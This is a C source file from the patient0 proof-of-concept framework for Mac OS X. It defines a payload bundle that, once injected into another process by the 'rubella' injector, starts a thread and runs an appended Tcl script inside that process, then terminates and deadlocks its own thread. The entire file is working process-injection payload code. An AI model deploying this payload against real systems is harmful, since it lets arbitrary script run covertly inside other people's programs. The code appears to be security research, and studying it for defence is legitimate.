/* tclist.c: proof of concept bundle which runs the script appended to
 * it when injected via patient0/rubella.
 *
 * Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file or at http://github.org/redpig/patient0.
 */
#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <pthread.h>
#include <tcl.h> /* Tcl framework. Ships with leopard :) */
#include <mach/thread_act.h>


#include <patient0/runtime.h>
#include <patient0/log.h>

static uint32_t script_size = 0;
static char *script = NULL;

void run_tcl(void *arg) {
  Tcl_Interp *interp;
  Tcl_Obj *obj;
  if (script) {
    script[script_size - 1] = '\0';
    p0_logf(P0_INFO, "creating a Tcl interpreter");
    interp = Tcl_CreateInterp();
    if (Tcl_Init(interp) != TCL_OK) {
      p0_logf(P0_ERR, "failed to initialized Tcl");
      runtime_deadlock();
    }
    p0_logf(P0_INFO, "evaluating Tcl script");
    obj = Tcl_NewStringObj(script, script_size);
    Tcl_EvalObjEx(interp, obj, TCL_EVAL_GLOBAL);
    p0_logf(P0_INFO, "Tcl_Eval returned.");
    /* Tcl_GetStringResult(interp) */
  }
}

void run(char *code, uint32_t size) {
  script_size = PATIENT0_PAYLOAD_SIZE(code, size);
  script = PATIENT0_PAYLOAD(code, size);
  pthread_t id;
  p0_logf(P0_INFO, "code: %p", code);
  p0_logf(P0_INFO, "code size: %d", size);
  p0_logf(P0_INFO, "script size: %d", script_size);
  p0_logf(P0_INFO, "script: %p", script);
  p0_logf(P0_INFO, "creating a new thread for tcl...");
  if (pthread_create(&id, NULL, run_tcl, NULL)) {
    p0_logf(P0_ERR, "failed to create thread");
  }
  p0_logf(P0_INFO, "deadlocking");
  /* TODO: vm_free self as well if we can
   *       then move it into runtime.h.  Otherwise we will still
   *       be wasting memory.
   */
  thread_terminate(mach_thread_self());
  runtime_deadlock();
}
